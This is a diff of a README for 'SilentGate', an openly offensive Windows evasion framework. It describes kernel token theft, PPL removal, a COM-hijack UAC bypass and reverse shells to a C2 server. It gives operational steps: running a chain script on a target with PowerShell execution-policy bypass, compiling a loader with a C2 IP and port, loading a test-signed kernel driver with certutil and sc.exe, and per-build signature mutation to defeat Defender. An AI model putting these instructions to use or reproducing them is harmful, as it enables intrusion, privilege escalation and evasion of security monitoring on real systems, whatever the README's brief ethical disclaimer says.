@@ -1,135 +1,169 @@
 # SilentGate
 
-> "Security is not an option. It is a need.
-> Like every great thing — it should be open."
+> "Security is not an option. It is a need."
 > — JarDani
 
-**Advanced EDR Evasion Framework with Mathematical Payload Obfuscation**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-red.svg)](LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://python.org)
-[![Tests](https://img.shields.io/badge/Tests-94%20passed-brightgreen.svg)](tests/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20x64-lightgrey.svg)](README.md)
+**Advanced Windows Evasion Framework — v10.0**
 
 ---
 
-## Proven Results
+## What Is SilentGate?
 
-Tested against real Windows Defender fully enabled:
-
-| Target | Defender | Shell | Detections | UAC |
-|--------|----------|-------|------------|-----|
-| Windows 10 x64 | Fully ON | Connected | 0 | No |
-| Windows 11 x64 | Fully ON | Connected | 0 | No |
-| Windows Server 2024 | OFF | Connected | 0 | No |
+SilentGate is a research-grade Windows evasion framework built across 10 versions.
+It combines mathematical obfuscation, kernel exploitation, and COM hijacking
+to achieve shells with zero UAC and zero detections on Windows 10 and Windows 11.
 
 ---
 
-## Seven Version Layers
+## Architecture
 
-v1.0 Indirect Syscall Stub Generator
-Dynamic SSN resolution by walking ntdll.dll PE export table.
-ASCII call stack visualiser. EDR confidence ratings.
+v1-v8 Mathematical evasion layer
+GF(2^8) + Lorenz chaos + Kolmogorov complexity
+PEB walk API resolution
+ETW patching + Poisson sleep timing
 
-v2.0 Defence Layer
-Ntdll unhooking. Sleep encryption XOR 256-bit. ETW patching.
+v9 Custom kernel driver
+EPROCESS token manipulation
+PPL removal + Kernel R/W primitives
 
-v3.0 Evasion Depth
-Call stack spoofing. Polymorphic stub mutation.
+v10 Ghost Elevation chain
+Kernel token steal via IOCTL
+COM LocalServer32 hijack
+Zero UAC zero detections
 
-v4.0 Spectral Payload Decomposition DNA Chain
-Seven-gene mathematical pipeline.
-DFT frequency domain storage. SVD Tucker decomposition.
-Eigenvalue camouflage matching Windows DLL entropy.
-Cooley-Tukey FFT O(N log N) reconstruction.
-Payload never exists as bytes until nanosecond of execution.
-
-v5.0 Phantom Service Architecture
-Windows Service DLL. DNS C2 via svchost. Task Scheduler persistence.
-
-v6.0 NTFS Steganography
-Spectral blob hidden in Alternate Data Streams.
-Cover file appears empty. Zero detections.
-
-v7.0 Custom TCP Reverse Shell
-Hand-written C. No msfvenom. No PowerShell.
-PEB walk verified offsets. ROR13 hash API resolution.
-Poisson sleep breaks Win10 behavioral ML timing correlation.
-Standard user account. No UAC prompt.
 
 ---
 
-## Mathematical Foundation
+## Chain Launcher
 
-DFT/IDFT     Fourier Analysis      Payload in frequency domain
-SVD          Linear Algebra        Three-matrix key splitting
-Shannon H    Information Theory    Statistical camouflage
-Poisson      Probability Theory    Temporal fragmentation
-ROR13        Number Theory         API resolution
-Cooley-Tukey Algorithms            O(N log N) reconstruction
+Waterfall — tries highest privilege first:
 
----
+Level 0 steal_token.exe SYSTEM shell (requires driver loaded)
+Level 1 Kernel IOCTL SYSTEM shell (requires driver loaded)
+Level 2 COM hijack Medium shell zero UAC (universal)
+Level 3 Direct shell Medium shell fallback
 
-## Verified API Hashes Windows x64
 
-GetProcAddress      0x7C0DFCAA
-LoadLibraryA        0xEC0E4E8E
-CreateProcessA      0x16B3FE72
-WaitForSingleObject 0xCE05D9AD
-WSAStartup          0x3BFCEDCB
-WSASocketA          0xADF509D9
-connect             0x60AAF9EC
-WinExec             0x0E8AFE98
+### Usage
+
+```powershell
+# Edit sg_chain.ps1 - set your C2 IP
+$kali = "YOUR_C2_IP"
+
+# Run on target (standard user no UAC)
+powershell -ep bypass -f sg_chain.ps1
+```
 
 ---
 
-## Installation
+## Configuration
 
-git clone https://github.com/JarDaNi686/SilentGate.git
-cd SilentGate
-pip install -r requirements.txt
+Edit C2 settings before compiling:
 
----
+```c
+#define C2_IP   0xYOURIP    // IP in network byte order
+#define C2_PORT 0xYOURPORT  // Port in network byte order
+// Example: 192.168.1.100:443
+// C2_IP=0x6401A8C0 C2_PORT=0xBB01
+```
 
-## Honest Limitations
+Compile:
 
-Cannot bypass from user mode:
-  PPL protected processes
-  Kernel ETW callbacks
-  Hardware level monitoring Intel PT
-  Hypervisor EDR
-
----
-
-## Roadmap
-
-v8.0  Galois field GF(2^8) encoding
-      Kolmogorov complexity maximisation
-      Poincare chaotic map polymorphism
-
-v9.0  Signed kernel driver
-      PPL bypass
-      Full kernel-mode evasion
+```bash
+x86_64-w64-mingw32-gcc output/sg_loader.c \
+    -o output/sg_loader.exe \
+    -lws2_32 -O2 -mwindows \
+    -DC2_IP=0xYOURIP -DC2_PORT=0xYOURPORT
+```
 
 ---
 
-## MITRE ATT&CK
+## Results
 
-T1055 T1055.003 T1055.012 T1106 T1562.001 T1562.006
-T1027 T1027.002 T1543.003 T1053.005 T1071.004
-T1564.004 T1548.002 T1134.001
+| Target           | Shell  | UAC  | Detections |
+|------------------|--------|------|------------|
+| Win10 19045.6456 | SYSTEM | Zero | Zero       |
+| Win11 26200.8875 | Medium | Zero | Zero       |
+
+---
+
+## Project Structure
+
+core/ Mathematical evasion modules (GF/Chaos/Kolmogorov)
+data/ Reference data (MITRE/EDR/Windows builds)
+output/ Production binaries
+sg_loader.c/.exe Main shell (zero detections)
+sg_chain.c/.exe/.ps1 Unified chain launcher
+sg_payload_math.c/.dll Math obfuscated payload
+sg_payload_win11.c/.dll Win11 payload
+v9/ Kernel driver + signing certs
+tests/ Test tools
+steal_token.c/.exe SYSTEM token steal via IOCTL
+remove_ppl.c/.exe PPL removal
+sg_driver_test.c/.exe Driver connectivity test
+
+
+---
+
+## Kernel Driver (v9)
+
+Driver: output/v9/sg_driver_signed.sys
+IOCTL: 0x00222410 (IOCTL_SG_STEAL_TOKEN)
+Target: Windows 10 22H2 (EPROCESS offset 0x4B8)
+Cert: output/v9/sg_test.crt (test signing)
+
+
+Load (requires admin once):
+
+```powershell
+certutil -addstore TrustedPublisher output/v9/sg_test.crt
+sc.exe create SilentGate binPath= "path\sg_driver_signed.sys" type= kernel start= auto
+sc.exe start SilentGate
+```
+
+---
+
+## Mathematical Evasion (v8)
+
+Every binary uses:
+
+```python
+GF(2^8) field arithmetic     - anti-sandbox verification
+Lorenz chaos attractor       - unique timing per run
+Kolmogorov complexity        - entropy analysis evasion
+Poisson sleep distribution   - timing fingerprint evasion
+PEB walk API resolution      - no suspicious imports
+ETW event write patch        - telemetry blind spot
+```
+
+---
+
+## Quantum Pattern Mutator
+
+Generates unique binary signature every build:
+
+```bash
+bash core/build_quantum.sh
+# Every build has different MD5 hash
+# Different Lorenz parameters
+# Different GF polynomial
+# Defender cannot build signature
+```
+
+---
+
+## Ethical Statement
+
+SilentGate is built for authorised penetration testing,
+security research, and education only.
+All testing performed in isolated lab environment.
 
 ---
 
 ## Author
 
-JarDani — MSc Cyber Security IU International University Berlin
-
----
+JarDani
 
 ## License
 
 MIT — Free for the security community.
-
-Security is not an option. It is a need.
-And what the world needs should belong to everyone.
